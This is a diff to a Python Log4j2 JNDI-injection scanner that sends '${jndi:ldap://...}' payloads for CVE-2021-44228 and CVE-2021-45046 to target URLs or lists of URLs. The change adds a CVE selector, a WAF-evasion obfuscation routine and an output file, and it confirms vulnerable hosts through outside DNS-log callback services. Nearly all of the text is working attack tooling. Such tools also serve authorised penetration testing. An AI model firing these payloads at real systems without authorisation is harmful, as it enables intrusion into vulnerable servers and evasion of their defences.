@@ -20,6 +20,7 @@ import argparse
 import textwrap
 import socks
 import urllib3
+import platform
 from random import getrandbits
 from urllib.parse import urlparse
 
@@ -27,20 +28,23 @@ urllib3.disable_warnings()
 
 
 def logger(log="green", text=""):
-    if log == "green":
-        print("\033[92m{}\033[0m".format(text))
-    if log == "green_b":
-        print("\033[1;92m{}\033[0m".format(text))
-    if log == "red":
-        print("\033[91m{}\033[0m".format(text))
-    if log == "white":
-        print("\033[37m{}\033[0m".format(text))
-    if log == "yellow":
-        print("\033[33m{}\033[0m".format(text))
-    if log == "blue":
-        print("\033[34m{}\033[0m".format(text))
-    if log == "banner":
-        print("\033[1;36m{}\033[0m".format(text))
+    if platform.system().lower() == 'windows':
+        print(text)
+    else:
+        if log == "green":
+            print("\033[92m{}\033[0m".format(text))
+        if log == "green_b":
+            print("\033[1;92m{}\033[0m".format(text))
+        if log == "red":
+            print("\033[91m{}\033[0m".format(text))
+        if log == "white":
+            print("\033[37m{}\033[0m".format(text))
+        if log == "yellow":
+            print("\033[33m{}\033[0m".format(text))
+        if log == "blue":
+            print("\033[34m{}\033[0m".format(text))
+        if log == "banner":
+            print("\033[1;36m{}\033[0m".format(text))
 
 
 def banners():
@@ -66,10 +70,13 @@ def arg():
     gen = parser.add_argument_group("Help", "How to use")
     gen.add_argument("-u", "--url", dest="url", type=str, help=" Target URL (e.g. http://example.com )")
     gen.add_argument("-f", "--file", dest="file", help="Select a target list file (e.g. list.txt )")
+    gen.add_argument("-c", "--cve", dest="cve", metavar="1", type=int, default=1,
+                     help="CVE [1:CVE-2021-44228, 2:CVE-2021-45046] default 1")
     gen.add_argument("-d", "--dns", dest="dns", metavar="1", type=int, default=1,
                      help="Dnslog [1:log.xn--9tr.com, 2:ceye.io] default 1")
     gen.add_argument("-p", dest="payload", help="Custom payload (e.g. ${jndi:ldap://xx.dns.xx/} ) ")
     gen.add_argument("-t", dest="timeout", metavar="10", default=10, help="Http timeout default 10s")
+    gen.add_argument("-o", dest="output", metavar="file", help="Output file")
     gen.add_argument("-w", "--waf", dest="waf", action='store_true', help="Obfuscate the payload and bypass waf")
     gen.add_argument("--proxy", dest="proxy", help="Proxy [socks5/socks4/http] (e.g. http://127.0.0.1:8080)")
     gen.add_argument("-h", "--help", action="help", help="Show this help message and exit")
@@ -110,6 +117,10 @@ def print_roundtrip(response, *args, **kwargs):
 
 
 def confuse_chars(char):
+    """
+    Reference: https://github.com/woodpecker-appstore/log4j-payload-generator/blob/master/src/main/java/me/gv7/woodpekcer/vuldb/StringObfuscator2.java
+    by https://github.com/c0ny1
+    """
     garbageCount = random.randint(1, 5)
     i = 0
     garbage = ''
@@ -125,10 +136,14 @@ def confuse_chars(char):
 
 
 def confuse_payload(chars):
+    """
+    Reference: https://github.com/woodpecker-appstore/log4j-payload-generator/blob/master/src/main/java/me/gv7/woodpekcer/vuldb/StringObfuscator2.java
+    by https://github.com/c0ny1
+    """
     lst = []
     for char in chars:
         use = not getrandbits(1)
-        if char == "$" or char == "{" or char == "}":
+        if char == "$" or char == "{" or char == "}" or char == "#":
             use = False
         if use:
             lst.append(confuse_chars(char))
@@ -320,27 +335,39 @@ def run_fuzz(target, payload, timeout, domain, token):
     if args.payload:
         logger("yellow", "[*] Please check your dns")
     else:
-        if dns_verify(args, result_md5_req, token):
+        if dns_verify(args, target, result_md5_req, token):
             logger("green", "[+] Log4j2 fuzz end")
         else:
             logger("yellow", "[-] Not found Log4j2 vuln, fuzz end")
 
 
 def check_log4j2(args):
+    if args.url == args.file:
+        logger("red", "[!] Must specify -u or -f")
+        sys.exit(0)
     dns_result = dnslog(args, type=args.dns)
     domain = dns_result[0]
     token = dns_result[1]
     timeout = args.timeout
+    logger("yellow", "[*] Get domain: {} token: {}".format(domain, token))
     if args.payload:
         payload = args.payload
-    else:
+    elif args.cve == 1:
         payload = "${{jndi:ldap://{0}/{1}}}".format("DNS_LOG_DOMAIN", random_str())
-    logger("yellow", "[*] Get domain: {} token: {}".format(domain, token))
-    logger("yellow", "[+] Use paylaod: {}".format(payload.replace("DNS_LOG_DOMAIN", "md5." + domain)))
+        logger("yellow",
+               "[+] Use CVE-2021-44228 paylaod: {}"
+               .format(payload.replace("DNS_LOG_DOMAIN", "md5." + domain)))
+    else:
+        payload = "${{jndi:ldap://127.0.0.1#{0}/{1}}}".format("DNS_LOG_DOMAIN", random_str())
+        logger("yellow",
+               "[+] Use CVE-2021-45046 paylaod: {}"
+               .format(payload.replace("DNS_LOG_DOMAIN", "md5." + domain)))
     if args.file:
         for line in open(args.file):
             line = line.strip()
             line = line.strip("\r\n")
+            if "http" not in line:
+                line = "http://" + line
             if line == "":
                 continue
             logger("yellow", "[+] Check target: {}".format(line))
@@ -348,21 +375,25 @@ def check_log4j2(args):
                 break
             run_fuzz(line, payload, timeout, domain, token)
     else:
+        if "http" not in args.url:
+            args.url = "http://" + args.url
         run_fuzz(args.url, payload, timeout, domain, token)
 
 
-def dns_verify(args, result_md5_req, token):
+def dns_verify(args, target, result_md5_req, token):
+    logger("yellow", "[*] Get dnslog results")
     dnslog_result = dnslog(args, type=args.dns, function="verify", token=token)
     i = 0
-    if dnslog_result:
-        for (key, value) in result_md5_req.items():
-            if key in dnslog_result:
-                logger("red", "[+] Found the Log4j2 vulnerability, Md5 is: {}".format(key))
-                logger("white", value)
-                i += 1
-        if i != 0:
-            return True
-    logger("red", "[-] Dns result failed")
+    for (key, value) in result_md5_req.items():
+        if key in dnslog_result:
+            logger("red", "[+] Found the Log4j2 vulnerability, Md5 is: {}".format(key))
+            logger("white", value)
+            if args.output:
+                with open(args.output, 'a') as output_file:
+                    output_file.write("{}\r\n{}\r\n".format(target, value))
+            i += 1
+    if i != 0:
+        return True
     return False
 
 
@@ -383,15 +414,15 @@ def dnslog(args, type=1, function="get", token="", md5=""):
             try:
                 time.sleep(2)
                 request = requests.get("https://log.xn--9tr.com/" + token, verify=False)
-                if "null" not in request.text:
-                    return request.text
+                return request.text
             except:
-                logger("red", "[-] https://log.xn--9tr.com/new_gen Request failed")
+                logger("red", "[-] https://log.xn--9tr.com/{} Request failed".format(token))
+                return ""
         return ["null", "null"]
     elif type == 2:
         if function == "get":
             if "xxxxxx" in args.ceye[0]:
-                logger("red", "[-] Need to set domain and token http://ceye.io")
+                logger("red", "[!] Need to set domain and token http://ceye.io")
                 sys.exit(0)
             return args.ceye
         elif function == "verify":
@@ -400,7 +431,8 @@ def dnslog(args, type=1, function="get", token="", md5=""):
                 request = requests.get("http://api.ceye.io/v1/records?token={}&type=dns".format(args.ceye[1]))
                 return request.text
             except:
-                logger("red", "[-] http://api.ceye.io/v1/ Request failed")
+                logger("red", "[-] http://api.ceye.io/v1/records?token={}&type=dns Request failed".format(args.ceye[1]))
+                return ""
         return ["null", "null"]
 
 
@@ -425,7 +457,7 @@ def proxy(args):
 if __name__ == '__main__':
     banners()
     logger("blue", "[*] Log4j2 jndi injection fuzz tool")
-    logger("blue", "[*] Version: 0.3")
+    logger("blue", "[*] Version: 0.4")
     logger("blue", "[*] From https://github.com/zhzyker/logmap")
     args = arg()
     args.ceye = ["xxxxxx.ceye.io", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
